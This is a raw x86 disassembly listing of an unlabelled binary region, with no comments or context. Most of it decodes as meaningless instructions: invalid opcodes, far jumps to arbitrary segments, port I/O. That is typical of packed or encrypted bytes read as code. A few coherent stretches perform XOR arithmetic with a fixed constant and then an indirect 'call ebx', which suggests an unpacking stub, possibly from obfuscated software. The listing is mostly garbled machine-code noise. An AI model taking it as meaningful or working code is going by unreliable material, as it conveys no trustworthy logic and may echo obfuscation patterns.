  40c452:	adc    eax,0x4ed957a2
  40c457:	cld    
  40c458:	cmp    DWORD PTR [eax],ebp
  40c45a:	mov    bl,0x80
  40c45c:	or     DWORD PTR [ebx+0x42],edi
  40c45f:	mov    esi,0xb8d14503
  40c464:	mov    esp,0xb37959cb
  40c469:	inc    ebp
  40c46a:	adc    eax,eax
  40c46c:	call   0xb121fabb
  40c471:	pusha  
  40c472:	lahf   
  40c473:	repz rcl DWORD PTR [ecx+0x3],0x2d
  40c478:	pop    ds
  40c479:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c47a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c47b:	jae    0x40c445
  40c47d:	test   DWORD PTR [ebp+0x42],0x647fdd14
  40c484:	nop
  40c485:	mov    ds:0x822ef345,al
  40c48a:	pop    edx
  40c48b:	inc    edi
  40c48c:	shl    BYTE PTR [ebx+0x57],0xe5
  40c490:	test   BYTE PTR ds:0xe5d9efe5,bh
  40c496:	jmp    0x2950:0x22eb6e3d
  40c49d:	mov    eax,0x299f3a1c
  40c4a3:	or     ebp,DWORD PTR [ebp+0x24]
  40c4a6:	sti    
  40c4a7:	cmp    eax,0x4699a05f
  40c4ac:	iret   
  40c4ad:	mov    ?,WORD PTR [eax+0x3fa6f202]
  40c4b3:	push   ebx
  40c4b4:	ss add al,0x7e
  40c4b7:	push   es
  40c4b8:	(bad)  
  40c4b9:	mov    esp,0xc04f846a
  40c4be:	sub    DWORD PTR [eax+eax*8],ebp
  40c4c1:	(bad)  
  40c4c2:	add    eax,0x90d5d825
  40c4c7:	std    
  40c4c8:	into   
  40c4c9:	data16 or dh,0x5f
  40c4cd:	xchg   ebx,eax
  40c4ce:	sub    ah,ch
  40c4d0:	loopne 0x40c4d3
  40c4d2:	sar    DWORD PTR [eax],0xb0
  40c4d5:	mov    ?,esi
  40c4d7:	inc    edi
  40c4d8:	mov    dh,0x9a
  40c4da:	lea    esp,[esi*8-0x744351f6]
  40c4e1:	mov    ecx,0x955c1ab8
  40c4e6:	fwait
  40c4e7:	mov    BYTE PTR [edi+0x4e4e17a5],0x6b
  40c4ee:	sub    eax,DWORD PTR [edi-0x5f]
  40c4f1:	push   ebx
  40c4f2:	pop    edi
  40c4f3:	inc    esi
  40c4f4:	pop    esp
  40c4f5:	dec    BYTE PTR [esi-0x94babbb]
  40c4fb:	scas   al,BYTE PTR es:[edi]
  40c4fc:	add    ah,al
  40c4fe:	cmp    bh,BYTE PTR [edi+0x485266d9]
  40c504:	cwde   
  40c505:	test   DWORD PTR cs:[esi],ecx
  40c508:	inc    edx
  40c509:	jle    0x40c499
  40c50b:	and    DWORD PTR [ecx],edx
  40c50d:	push   ebx
  40c50e:	ja     0x40c54f
  40c510:	scas   al,BYTE PTR es:[edi]
  40c511:	push   es
  40c512:	imul   edx,DWORD PTR [ebp+0x53],0x5848b43
  40c519:	int    0x8
  40c51b:	dec    edi
  40c51c:	cmc    
  40c51d:	out    0x66,al
  40c51f:	ss cs jle 0x40c4ce
  40c523:	fwait
  40c524:	dec    edi
  40c525:	es cdq 
  40c527:	mov    esi,0xf9684c8f
  40c52c:	jns    0x40c511
  40c52e:	and    al,0x34
  40c530:	sub    eax,0xc24bb6ec
  40c535:	pushf  
  40c536:	iret   
  40c537:	dec    si
  40c539:	adc    cl,BYTE PTR es:[ebp+eiz*2+0x77c5c483]
  40c541:	sub    ebx,DWORD PTR [ecx]
  40c543:	sub    BYTE PTR [eax-0x3a],dl
  40c546:	(bad)  
  40c547:	mov    al,BYTE PTR [ebx+ecx*2+0xf]
  40c54b:	add    BYTE PTR [esi-0x1de19599],dl
  40c551:	and    ebx,DWORD PTR [ecx-0x4fddc64b]
  40c557:	outs   dx,BYTE PTR ds:[esi]
  40c558:	ret    0xe071
  40c55b:	cwde   
  40c55c:	sbb    BYTE PTR [ebp+0x6c],al
  40c55f:	aam    0x66
  40c561:	rcr    DWORD PTR [esi+0x72],cl
  40c564:	inc    ebp
  40c565:	adc    bh,ch
  40c567:	dec    edi
  40c568:	pushf  
  40c569:	mov    ds:0x38a0dfbe,al
  40c56e:	(bad)  
  40c56f:	fdivp  st(5),st
  40c571:	into   
  40c572:	out    0xa8,eax
  40c574:	pushf  
  40c575:	mov    ch,0xab
  40c578:	ficom  WORD PTR [esi+0x7]
  40c57b:	add    al,0x32
  40c57d:	ja     0x40c52e
  40c57f:	fmul   DWORD PTR [edi-0x2d]
  40c582:	retf   
  40c583:	loop   0x40c505
  40c585:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c586:	in     al,dx
  40c587:	aad    0x8b
  40c589:	stc    
  40c58a:	stos   BYTE PTR es:[edi],al
  40c58b:	call   0xac76:0xa07d6bd6
  40c592:	jl     0x40c5e1
  40c594:	sbb    dh,bl
  40c596:	jae    0x40c5f0
  40c598:	call   DWORD PTR [edi-0x6]
  40c59b:	ja     0x40c591
  40c59d:	jae    0x40c608
  40c59f:	nop
  40c5a0:	cdq    
  40c5a1:	rcr    BYTE PTR [esi-0x4a32b3fb],0xaf
  40c5a8:	mov    ch,0x98
  40c5aa:	fadd   QWORD PTR [esi]
  40c5ac:	jae    0x40c557
  40c5ae:	outs   dx,BYTE PTR ds:[esi]
  40c5af:	xor    eax,0xf472e503
  40c5b4:	outs   dx,BYTE PTR ds:[esi]
  40c5b5:	mov    ebx,0xa1bc26c2
  40c5ba:	push   ds
  40c5bb:	add    al,0x3e
  40c5bd:	and    al,0xc6
  40c5bf:	or     eax,0xb19921b4
  40c5c4:	adc    ah,BYTE PTR [edx-0x1e]
  40c5c7:	pop    edi
  40c5c8:	(bad)  
  40c5c9:	jmp    0x40c5a1
  40c5cb:	sub    eax,eax
  40c5cd:	dec    ebx
  40c5ce:	push   ss
  40c5cf:	gs xchg edi,eax
  40c5d1:	and    DWORD PTR [esi-0x7c],edx
  40c5d4:	popf   
  40c5d5:	call   0xcd19:0x4ef7429c
  40c5dc:	add    eax,0x3b803f11
  40c5e1:	xor    ecx,esp
  40c5e3:	retf   0xa70b
  40c5e6:	lock sub al,0x9a
  40c5e9:	loop   0x40c5ff
  40c5eb:	xlat   BYTE PTR ds:[ebx]
  40c5ec:	popa   
  40c5ed:	icebp  
  40c5ee:	imul   esi,eax,0x589f51fc
  40c5f4:	shr    bl,1
  40c5f6:	mov    BYTE PTR [edx+0x5f],dl
  40c5f9:	add    DWORD PTR [eax-0x69cd85b9],eax
  40c5ff:	adc    ebp,DWORD PTR [esi+0x508d0b71]
  40c605:	sar    esi,cl
  40c607:	mov    ds:0xa698818a,al
  40c60c:	push   ebx
  40c60d:	js     0x40c641
  40c60f:	cmp    eax,0xfdf753ee
  40c614:	mov    ah,0x88
  40c616:	push   ebp
  40c617:	xchg   ecx,eax
  40c618:	adc    eax,0x60cd441b
  40c61d:	mov    ds:0x1d0362c4,al
  40c622:	push   ss
  40c623:	daa    
  40c624:	aad    0xe9
  40c626:	adc    al,0x12
  40c628:	pop    ecx
  40c629:	(bad)  
  40c62a:	xchg   ecx,eax
  40c62b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c62d:	jns    0x40c630
  40c62f:	xchg   esp,eax
  40c630:	mov    dh,0xe6
  40c632:	add    dl,BYTE PTR ds:0x57bacb0
  40c638:	cmp    cl,cl
  40c63a:	jl     0x40c5e5
  40c63c:	inc    esp
  40c63d:	dec    eax
  40c63e:	xchg   esi,eax
  40c63f:	adc    al,0x30
  40c641:	shl    esp,1
  40c643:	fist   DWORD PTR [ebx]
  40c645:	xchg   edi,eax
  40c646:	addr16 xchg esp,eax
  40c648:	push   ss
  40c649:	add    cl,BYTE PTR ds:0x50ed74e4
  40c64f:	jae    0x40c67d
  40c651:	sub    edi,DWORD PTR [edx]
  40c653:	jne    0x40c6cb
  40c655:	inc    edi
  40c656:	xchg   DWORD PTR cs:[ecx+0x5],edi
  40c65a:	scas   al,BYTE PTR es:[edi]
  40c65b:	jne    0x40c61a
  40c65d:	jmp    0x40c667
  40c65f:	call   0x8c4c415e
  40c664:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c665:	mov    ch,0x5d
  40c667:	adc    al,0x72
  40c669:	int    0x20
  40c66b:	rol    DWORD PTR [edx-0x12f23fe4],0xb2
  40c672:	int3   
  40c673:	cmp    ah,bh
  40c675:	push   esi
  40c676:	loopne 0x40c6b8
  40c678:	enter  0x94df,0x74
  40c67c:	mov    esi,0xe917d8ab
  40c681:	cdq    
  40c682:	mov    ah,0xef
  40c684:	push   ecx
  40c685:	pop    eax
  40c686:	cmp    eax,0x6e97b35
  40c68b:	lods   eax,DWORD PTR ds:[esi]
  40c68c:	cmp    al,0xf7
  40c68e:	stc    
  40c68f:	xor    BYTE PTR [eax+0x66],dl
  40c692:	push   eax
  40c693:	retf   
  40c694:	jg     0x40c690
  40c696:	xchg   edi,eax
  40c697:	imul   edi,DWORD PTR [esi+0x32729b],0xf7f7fe03
  40c6a1:	mov    edx,DWORD PTR [ebp-0x4]
  40c6a4:	xor    edx,ecx
  40c6a6:	lea    eax,[edx+eax*1+0x32729b]
  40c6ad:	mov    edx,DWORD PTR [ebp+0x8]
  40c6b0:	mov    edi,DWORD PTR [ebp-0x24]
  40c6b3:	mov    DWORD PTR [edi+edx*4],eax
  40c6b6:	mov    eax,DWORD PTR [ebp-0x18]
  40c6b9:	mov    edx,DWORD PTR [ebp+0x8]
  40c6bc:	xor    eax,ecx
  40c6be:	lea    eax,[eax+edx*1+0x32729b]
  40c6c5:	mov    DWORD PTR [ebp+0x8],eax
  40c6c8:	mov    eax,DWORD PTR [ebp-0x18]
  40c6cb:	jmp    0x40c92e
  40c6d0:	leave  
  40c6d1:	adc    bl,ah
  40c6d3:	cmp    eax,0x10f1ede3
  40c6d8:	xor    BYTE PTR [ebp-0x4550653f],dl
  40c6de:	loop   0x40c75f
  40c6e0:	fiadd  WORD PTR [eax+0x7c387e7e]
  40c6e6:	jle    0x40c766
  40c6e8:	retf   
  40c6e9:	jmp    0x27fd:0x779a4238
  40c6f0:	rol    DWORD PTR [edx+0x7dfe82dd],0x9a
  40c6f7:	xchg   BYTE PTR [edi-0x36],cl
  40c6fa:	pushf  
  40c6fb:	mov    esi,eax
  40c6fd:	fs cmp eax,0xf96bdc35
  40c703:	cmp    eax,0x4b6eb6c6
  40c708:	push   ss
  40c709:	in     al,dx
  40c70a:	inc    esi
  40c70b:	cmp    ecx,DWORD PTR [esi+edi*1-0xad68263]
  40c712:	fs clc 
  40c714:	je     0x40c72b
  40c716:	mov    DWORD PTR [edx+eiz*4-0x30],ebx
  40c71a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c71b:	adc    BYTE PTR [ebx],dl
  40c71d:	add    al,0x48
  40c71f:	inc    ecx
  40c720:	jmp    0x20573078
  40c725:	retf   0xd8
  40c728:	mov    esp,0xbc857fa
  40c72d:	xchg   edi,eax
  40c72e:	mov    al,dl
  40c730:	hlt    
  40c731:	imul   BYTE PTR [eax+0x72e81b03]
  40c737:	inc    esi
  40c738:	sub    BYTE PTR [edi+0x249cf16d],dl
  40c73e:	push   DWORD PTR [edx]
  40c740:	nop
  40c741:	cdq    
  40c742:	sub    esi,0x68
  40c745:	or     DWORD PTR ds:0x6d64dcb,esi
  40c74b:	cmp    BYTE PTR [edx],dl
  40c74d:	scas   eax,DWORD PTR es:[edi]
  40c74e:	adc    ebx,DWORD PTR ds:0xa744a42f
  40c754:	call   0x75eff5cf
  40c759:	add    ch,bl
  40c75b:	fidivr DWORD PTR [edx-0x35cde85e]
  40c761:	repz and DWORD PTR [ecx-0x89062b9],0x74d3ad5f
  40c76c:	cli    
  40c76d:	sar    BYTE PTR [ebx-0x3f],0x50
  40c771:	add    ebx,edx
  40c773:	sbb    dh,0xd1
  40c776:	sub    bl,BYTE PTR [edi+0x4e]
  40c779:	mov    edx,0x4a1b86b8
  40c77e:	jmp    0x40c766
  40c780:	inc    ebx
  40c781:	push   0xc
  40c783:	sti    
  40c784:	ins    BYTE PTR es:[edi],dx
  40c785:	dec    esi
  40c786:	mov    ch,0x74
  40c788:	push   0xfffffff8
  40c78a:	imul   edi,DWORD PTR [edx-0x98add1e],0xf6e70e54
  40c794:	push   ebx
  40c795:	out    0x5d,al
  40c797:	neg    BYTE PTR [esi-0x5d]
  40c79a:	loopne 0x40c7ce
  40c79c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c79d:	and    al,0xf2
  40c79f:	inc    esi
  40c7a0:	and    al,0x48
  40c7a2:	iret   
  40c7a3:	lods   eax,DWORD PTR ds:[esi]
  40c7a4:	mov    dh,0x12
  40c7a6:	cmc    
  40c7a7:	call   0x2d8d:0x55c8ec4b
  40c7ae:	mov    ah,0x20
  40c7b0:	pop    eax
  40c7b1:	imul   BYTE PTR [esi-0xca2d38a]
  40c7b7:	mov    ch,0xd6
  40c7b9:	dec    edx
  40c7ba:	add    al,0x5d
  40c7bc:	bound  ecx,QWORD PTR [eax]
  40c7be:	addr16 loopne 0x40c788
  40c7c1:	pop    edi
  40c7c2:	fsub   QWORD PTR [ecx+0x73]
  40c7c5:	das    
  40c7c6:	dec    esp
  40c7c7:	mov    ecx,0xaf49cc42
  40c7cc:	jge    0x40c834
  40c7ce:	cmp    ah,BYTE PTR [ebx+0x5c]
  40c7d1:	pop    edi
  40c7d2:	sahf   
  40c7d3:	sahf   
  40c7d4:	fcmovu st,st(7)
  40c7d6:	mov    edx,0x2e4b76c1
  40c7db:	add    al,0xa3
  40c7dd:	xor    ebx,esp
  40c7df:	test   DWORD PTR [ecx],esi
  40c7e1:	or     ecx,DWORD PTR [edi-0x35]
  40c7e4:	or     al,0xc1
  40c7e6:	and    BYTE PTR [esi],ah
  40c7e8:	repnz dec ebp
  40c7ea:	or     ecx,DWORD PTR ds:0xdd18facc
  40c7f0:	fs popa 
  40c7f2:	jecxz  0x40c814
  40c7f4:	scas   al,BYTE PTR es:[edi]
  40c7f5:	dec    ebx
  40c7f6:	cmp    ebp,DWORD PTR [edx+0x35]
  40c7f9:	frstor [edi]
  40c7fb:	scas   al,BYTE PTR es:[edi]
  40c7fc:	push   es
  40c7fd:	xchg   ebx,eax
  40c7fe:	rcr    BYTE PTR [ebx+edi*8-0x6c848ba7],1
  40c805:	jo     0x40c7e6
  40c807:	and    edi,DWORD PTR [eax]
  40c809:	push   esp
  40c80a:	(bad)  
  40c80b:	pop    eax
  40c80c:	stos   BYTE PTR es:[edi],al
  40c80d:	cmc    
  40c80e:	jne    0x40c816
  40c810:	aad    0xf4
  40c812:	or     BYTE PTR [esi-0x6d385431],0x6
  40c819:	(bad)  
  40c81b:	mov    WORD PTR [edx],fs
  40c81d:	sbb    al,0x8d
  40c81f:	dec    ebp
  40c820:	fdivr  st(4),st
  40c822:	leave  
  40c823:	jmp    0x4d55:0xec93a48c
  40c82a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c82b:	fnsave [ecx]
  40c82d:	lea    eax,[eax]
  40c82f:	mov    esi,ebp
  40c831:	mov    ch,0x45
  40c833:	ret    0x38b5
  40c836:	int3   
  40c837:	(bad)  
  40c838:	lds    ecx,FWORD PTR [ebx+0x65e4db0a]
  40c83e:	je     0x40c7ce
  40c840:	shl    BYTE PTR [ecx],1
  40c842:	int    0xa7
  40c844:	adc    ebx,edi
  40c846:	sar    edi,cl
  40c848:	es out 0x44,al
  40c84b:	and    ecx,DWORD PTR [eax+0xa173487]
  40c851:	call   0x7c37:0x2768ffb3
  40c858:	ds daa 
  40c85a:	cmp    DWORD PTR [edx+0x32],edi
  40c85d:	stc    
  40c85e:	out    0xd9,eax
  40c860:	daa    
  40c861:	jecxz  0x40c8a7
  40c863:	fs xor eax,0x80dd70cb
  40c869:	mov    BYTE PTR [ebx],dl
  40c86b:	jmp    0x40c81b
  40c86d:	push   cs
  40c86e:	or     eax,0x32f6321f
  40c873:	mov    BYTE PTR [edx+0x770e0ec8],bl
  40c879:	inc    ebp
  40c87a:	push   edi
  40c87c:	lahf   
  40c87d:	daa    
  40c87e:	nop
  40c87f:	jae    0x40c8ee
  40c881:	iret   
  40c882:	sub    DWORD PTR [ebx-0x5479e240],ebx
  40c888:	shl    DWORD PTR [ecx-0x3b],cl
  40c88b:	push   edi
  40c88c:	mov    eax,DWORD PTR [esi-0x7c]
  40c88f:	lea    esi,[edx-0x52]
  40c892:	push   edx
  40c893:	outs   dx,BYTE PTR ds:[esi]
  40c894:	push   0x6d
  40c896:	retf   0x161e
  40c899:	mov    esi,0xdd14ccb1
  40c89e:	aaa    
  40c89f:	sbb    al,0x23
  40c8a1:	xchg   ecx,eax
  40c8a2:	add    DWORD PTR [eax],esp
  40c8a4:	adc    DWORD PTR [edx-0x43f8a99f],esi
  40c8aa:	sbb    DWORD PTR [edi],0x5a
  40c8ad:	call   0x33b23616
  40c8b2:	mov    dh,0x5
  40c8b4:	stc    
  40c8b5:	inc    ebx
  40c8b6:	mov    dh,0x44
  40c8b8:	pop    edx
  40c8b9:	imul   eax,DWORD PTR [ecx],0xfd3b3eda
  40c8bf:	test   ch,dl
  40c8c1:	daa    
  40c8c2:	push   esp
  40c8c3:	outs   dx,BYTE PTR ds:[esi]
  40c8c4:	inc    esi
  40c8c5:	jp     0x40c90a
  40c8c7:	or     eax,edi
  40c8c9:	js     0x40c867
  40c8cb:	out    0x6c,al
  40c8cd:	loopne 0x40c8c6
  40c8cf:	mov    al,0xcd
  40c8d1:	xchg   esp,eax
  40c8d2:	cmp    cl,bh
  40c8d4:	(bad)  
  40c8d5:	mov    ebp,0xae69fb75
  40c8da:	and    al,0x17
  40c8dc:	shr    bl,0x1
  40c8df:	(bad)  
  40c8e0:	sti    
  40c8e1:	inc    edx
  40c8e2:	cwde   
  40c8e3:	rcr    DWORD PTR [ecx+0x33dd366d],0x3
  40c8ea:	daa    
  40c8eb:	jae    0x40c907
  40c8ed:	mov    ebx,0x1afe4b45
  40c8f2:	(bad)  
  40c8f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8f4:	jp     0x40c8dd
  40c8f6:	imul   ebx,esi,0x71fd09c0
  40c8fc:	adc    al,BYTE PTR [ebx-0x6ba69694]
  40c902:	pop    edi
  40c903:	data16 jns 0x40c8e0
  40c906:	inc    ebp
  40c907:	xchg   BYTE PTR [edx],al
  40c909:	pop    esp
  40c90a:	pop    ecx
  40c90b:	mov    esp,cs
  40c90d:	pushf  
  40c90e:	popa   
  40c90f:	outs   dx,BYTE PTR ds:[esi]
  40c910:	sub    al,BYTE PTR cs:[ecx]
  40c913:	fild   WORD PTR [edx-0x76fd0d45]
  40c919:	bound  ecx,QWORD PTR [ebx+0x5c]
  40c91c:	ins    DWORD PTR es:[edi],dx
  40c91d:	sti    
  40c91e:	xchg   ebp,eax
  40c91f:	fmul   DWORD PTR [eax]
  40c921:	push   0xa00240f2
  40c926:	in     eax,0x47
  40c928:	push   ds
  40c929:	dec    ecx
  40c92a:	(bad)  
  40c92c:	inc    eax
  40c92d:	xor    BYTE PTR [ebx-0x3eccebab],cl
  40c933:	jmp    0x40cb96
  40c938:	pop    es
  40c939:	mov    ah,0x6
  40c93b:	cwde   
  40c93c:	mov    ch,0xa8
  40c93e:	mov    eax,ds:0x31ca67b1
  40c943:	cmp    DWORD PTR [eax-0x4e],ebp
  40c946:	dec    esi
  40c947:	xchg   BYTE PTR [eax+0x387e7e8e],bl
  40c94d:	jl     0x40c9cd
  40c94f:	jle    0x40c8f7
  40c951:	lds    ebp,FWORD PTR [edi+0x380706b2]
  40c957:	jno    0x40c95f
  40c959:	rcl    BYTE PTR [esp+ebx*4+0x43],cl
  40c95d:	or     eax,0xa904a878
  40c962:	xor    eax,DWORD PTR [ebx-0x80]
  40c965:	fisttp DWORD PTR [ecx-0xdb261a0]
  40c96b:	push   ecx
  40c96c:	cmp    edi,0xffffffbd
  40c96f:	jge    0x40c9ac
  40c971:	leave  
  40c972:	bound  esi,QWORD PTR [edi+edx*8]
  40c975:	xor    DWORD PTR [eax-0x53],ebp
  40c978:	not    DWORD PTR fs:[ebx+edx*1]
  40c97c:	data16 not BYTE PTR [eax+0x58]
  40c980:	mov    ch,0x5d
  40c982:	jno    0x40c9b6
  40c984:	(bad)  
  40c985:	fcomp  QWORD PTR [edx+0x558c71f5]
  40c98b:	pushf  
  40c98c:	or     al,BYTE PTR [edx+edi*8]
  40c98f:	retf   0xf6cc
  40c992:	out    dx,eax
  40c993:	cs lahf 
  40c995:	adc    dh,bl
  40c997:	xchg   BYTE PTR [edi+0x4e8db2cd],bh
  40c99d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c99e:	xchg   edi,eax
  40c99f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9a0:	mov    esp,0xda963d1e
  40c9a5:	daa    
  40c9a6:	(bad)  
  40c9a7:	mov    eax,0x33a38b9e
  40c9ac:	dec    ebx
  40c9ad:	outs   dx,DWORD PTR ds:[esi]
  40c9ae:	xor    esi,edx
  40c9b0:	jmp    DWORD PTR [edx+0x9]
  40c9b3:	or     al,0x4d
  40c9b5:	rcr    DWORD PTR [ecx],cl
  40c9b7:	cmp    eax,0xf1d3344d
  40c9bc:	cmp    dh,ch
  40c9be:	inc    ebp
  40c9bf:	cmp    ah,BYTE PTR [edi-0x450e38e4]
  40c9c5:	(bad)  
  40c9c6:	icebp  
  40c9c7:	imul   esp,DWORD PTR ds:0x87d000c2,0x62
  40c9ce:	mov    edx,0xcbfc4da4
  40c9d3:	mov    ?,esi
  40c9d5:	test   al,0xf6
  40c9d7:	je     0x40c9f7
  40c9d9:	sub    esp,DWORD PTR ds:0x19745b3e
  40c9df:	enter  0x3645,0x84
  40c9e3:	bound  eax,QWORD PTR [ecx+0x40]
  40c9e6:	and    eax,0xdcb8d61e
  40c9eb:	mov    eax,0x9e277851
  40c9f0:	mov    edx,0xa3cc21e2
  40c9f5:	inc    esi
  40c9f6:	jle    0x40c9c4
  40c9f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9f9:	mov    ebp,0x75f86983
  40c9fe:	dec    edi
  40c9ff:	pop    edi
  40ca00:	in     eax,dx
  40ca01:	cmp    bh,dl
  40ca03:	test   al,0xea
  40ca05:	fs jnp 0x40ca50
  40ca08:	dec    esp
  40ca09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca0a:	ss test al,0x29
  40ca0d:	fld    DWORD PTR [ebx-0xb3abc33]
  40ca13:	retf   0xdfb1
  40ca16:	call   0x7cf15119
  40ca1b:	adc    al,0xca
  40ca1d:	mov    DWORD PTR [edi+eiz*2+0x62],ecx
  40ca21:	xchg   ebx,eax
  40ca22:	inc    eax
  40ca23:	sbb    eax,0xf788f7fe
  40ca28:	mov    bl,0x21
  40ca2a:	cmp    DWORD PTR [edx-0x71],ebx
  40ca2d:	fisttp WORD PTR [ebx-0xd22ed51]
  40ca33:	inc    edx
  40ca34:	loopne 0x40c9f4
  40ca36:	jno    0x40ca3f
  40ca38:	aad    0x94
  40ca3a:	std    
  40ca3b:	aad    0x38
  40ca3d:	in     al,dx
  40ca3e:	mov    WORD PTR [eax],?
  40ca40:	or     DWORD PTR [esi+0x2ad3e8bb],esi
  40ca46:	dec    ebp
  40ca47:	dec    DWORD PTR [ebx]
  40ca49:	out    dx,al
  40ca4a:	push   esp
  40ca4b:	xchg   DWORD PTR [esp+esi*2-0xa],eax
  40ca4f:	inc    esi
  40ca50:	jo     0x40c9ee
  40ca52:	jmp    0xfc46a019
  40ca57:	adc    edx,DWORD PTR [eax+eiz*8+0x1d]
  40ca5b:	gs push ecx
  40ca5d:	arpl   WORD PTR [ebx+0x540ef531],ax
  40ca63:	mov    WORD PTR [ebx+ecx*2+0x1eac7f81],gs
  40ca6a:	xchg   edi,eax
  40ca6b:	ss dec eax
  40ca6d:	les    ebx,FWORD PTR [eax-0x48a6feae]
  40ca73:	lahf   
  40ca74:	or     al,0xf7
  40ca76:	jns    0x40c9f9
  40ca78:	adc    eax,0x2d57a344
  40ca7d:	dec    ebx
  40ca7e:	fld    DWORD PTR [ecx-0xc]
  40ca81:	(bad)
  40ca85:	or     edx,esi
  40ca87:	adc    eax,0xc680309a
  40ca8c:	sub    ebp,DWORD PTR ds:0x88b9fb9
  40ca92:	mov    esp,0x13e7883
  40ca97:	aam    0xe7
  40ca99:	fwait
  40ca9a:	sbb    edx,esp
  40ca9c:	or     BYTE PTR [eax-0x4d],0x9
  40caa0:	sub    al,0x30
  40caa2:	dec    esp
  40caa3:	dec    ebx
  40caa4:	pop    ecx
  40caa5:	pop    esp
  40caa6:	mov    ebp,gs
  40caa8:	dec    esp
  40caa9:	cld    
  40caaa:	sbb    DWORD PTR [ecx-0x67715e2f],ebx
  40cab0:	enter  0x7f53,0x67
  40cab4:	add    DWORD PTR [eax-0x6689f421],ebx
  40caba:	into   
  40cabb:	jnp    0x40ca5b
  40cabd:	mov    ebp,DWORD PTR [edx]
  40cabf:	xor    bh,BYTE PTR [edi+0x51]
  40cac2:	pushf  
  40cac3:	inc    edx
  40cac4:	lea    esi,[edx-0x36]
  40cac7:	nop
  40cac8:	xchg   edi,eax
  40cac9:	lock add esi,DWORD PTR [edx]
  40cacc:	retf   
  40cacd:	ja     0x40cade
  40cacf:	data16 cld 
  40cad1:	or     ch,BYTE PTR [ecx]
  40cad3:	add    BYTE PTR [eax-0x7be007fe],0x53
  40cada:	(bad)  
  40cadb:	jecxz  0x40cb26
  40cadd:	jp     0x40ca87
  40cadf:	fld    DWORD PTR [edi-0x28ac83c4]
  40cae5:	mov    esi,0x8d1d76e1
  40caea:	inc    edx
  40caeb:	lods   al,BYTE PTR ds:[esi]
  40caec:	and    eax,0x2af18b40
  40caf1:	cwde   
  40caf2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40caf3:	mov    esp,0x79796209
  40caf8:	adc    ebx,0xffffffb8
  40cafb:	cmp    ecx,DWORD PTR [esi+0x4b]
  40cafe:	aaa    
  40caff:	bound  ebp,QWORD PTR [ebp-0x13]
  40cb02:	inc    ebx
  40cb03:	add    BYTE PTR [ecx],dl
  40cb05:	mov    ds:0x2c7b167c,al
  40cb0a:	xor    DWORD PTR [edi],esi
  40cb0c:	push   ebx
  40cb0d:	inc    edi
  40cb0e:	je     0x40cabf
  40cb10:	fdivr  DWORD PTR [ecx-0x4807938c]
  40cb16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb17:	xchg   dl,ah
  40cb19:	mov    eax,ds:0xe8a04412
  40cb1e:	push   ecx
  40cb1f:	int3   
  40cb20:	cmp    al,BYTE PTR [ebx-0x213fb2bb]
  40cb26:	dec    eax
  40cb27:	ins    DWORD PTR es:[edi],dx
  40cb28:	add    BYTE PTR [ecx-0x77],al
  40cb2b:	mov    dl,0xe3
  40cb2d:	cmp    DWORD PTR ds:[ebp+0x20162cea],0xffffff9f
  40cb35:	push   cs
  40cb36:	icebp  
  40cb37:	or     cl,ch
  40cb39:	mov    ds:0x4511621a,al
  40cb3e:	inc    ebx
  40cb3f:	out    0xde,eax
  40cb41:	or     BYTE PTR [edx+eax*8],0xd5
  40cb45:	ss test eax,0x7f97deb3
  40cb4b:	or     al,0x2c
  40cb4d:	inc    ecx
  40cb4e:	mov    WORD PTR [eax],ds
  40cb50:	mov    dh,0x50
  40cb52:	or     ah,ah
  40cb54:	and    DWORD PTR [ecx],0xc0474d4c
  40cb5a:	adc    BYTE PTR fs:[ebp-0x33],dh
  40cb5e:	sub    ecx,esi
  40cb60:	bound  ebx,QWORD PTR [eax]
  40cb62:	pop    eax
  40cb63:	loope  0x40cbe4
  40cb65:	push   eax
  40cb66:	jns    0x40cb3d
  40cb68:	ror    dl,0x75
  40cb6b:	sbb    ch,BYTE PTR [edi+0x290870e1]
  40cb71:	test   esi,edx
  40cb73:	les    edi,FWORD PTR [ebx-0x7a90fc31]
  40cb79:	arpl   WORD PTR [ebx-0x5c],bx
  40cb7c:	pop    edi
  40cb7d:	jns    0x40cbe7
  40cb7f:	int    0x1c
  40cb81:	enter  0x4107,0x81
  40cb85:	dec    ebx
  40cb86:	dec    esp
  40cb87:	lds    ebx,FWORD PTR [eax+0x5a]
  40cb8a:	adc    cl,0x71
  40cb8d:	repnz and BYTE PTR [ebp+edi*1-0x61915486],ah
  40cb95:	rol    DWORD PTR [ebx],0xc6
  40cb98:	imul   eax,DWORD PTR [edx]
  40cb9b:	mov    edx,DWORD PTR [ebp-0x4]
  40cb9e:	xor    edx,ecx
  40cba0:	mov    ecx,DWORD PTR [ebp+0x8]
  40cba3:	lea    ecx,[edx+ecx*1+0x32729b]
  40cbaa:	cmp    ecx,eax
  40cbac:	jne    0x40c41f
  40cbb2:	mov    ebx,esi
  40cbb4:	jmp    0x40cbbe
  40cbb9:	mov    ebx,0x32729b
  40cbbe:	mov    eax,DWORD PTR [ebp-0x4]
  40cbc1:	xor    eax,0x7510854
  40cbc6:	add    eax,ebx
  40cbc8:	mov    DWORD PTR [ebp-0xc],eax
  40cbcb:	xor    ebx,ebx
  40cbcd:	lea    eax,[ebp-0x10]
  40cbd0:	add    ebx,DWORD PTR [eax]
  40cbd2:	call   ebx
  40cbd4:	xor    ebx,ebx
  40cbd6:	inc    ebx
  40cbd7:	cmp    DWORD PTR [ebp+0x10],ebx
  40cbda:	je     0x40d321
  40cbe0:	xchg   edx,eax
  40cbe1:	push   0xa
  40cbe3:	pop    ecx
  40cbe4:	push   0x4
  40cbe6:	pop    ebx
  40cbe7:	inc    ebx
  40cbe8:	xchg   ebx,ecx
  40cbea:	jmp    0x40ce4d
  40cbef:	imul   edx,DWORD PTR [edi-0x4b0ecbf3],0x73
